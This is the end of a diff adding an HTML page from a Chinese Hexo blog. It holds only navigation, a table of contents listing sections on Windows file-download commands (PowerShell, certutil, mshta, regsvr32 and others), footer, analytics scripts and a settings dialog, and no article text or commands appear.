+    <a href="../%E5%B8%B8%E7%94%A8%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4%E4%B9%8BLinux/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">常用下载命令整理-Linux篇</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E7%BB%BC%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">1.综述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%B8%B8%E7%94%A8%E4%B8%8B%E8%BD%BD%E6%8C%87%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">2. 常用下载指令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-PowerShell"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-Bitsadmin"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Bitsadmin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-certutil"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 certutil</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-ipc-%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 ipc$ 文件共享</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-5-FTP"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 FTP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-6-msiexec"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 msiexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-7-mshta"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 mshta</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-8-rundll32"><span class="nav-number">2.8.</span> <span class="nav-text">2.8 rundll32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-9-regsvr32"><span class="nav-number">2.9.</span> <span class="nav-text">2.9 regsvr32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-10-pubprn-vbs"><span class="nav-number">2.10.</span> <span class="nav-text">2.10 pubprn.vbs</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">3.</span> <span class="nav-text">参考链接</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2022 Blog All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				访客数 : <span id="busuanzi_value_site_uv"></span> |  
+				访问量 : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="../../../../categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="../../../../tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="../../../../about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">
+
+  
+<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="../../../../js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="../../../../js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Blog
+          </div>
+          <div class="panel-body">
+            Copyright © 2022 Wayoka All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
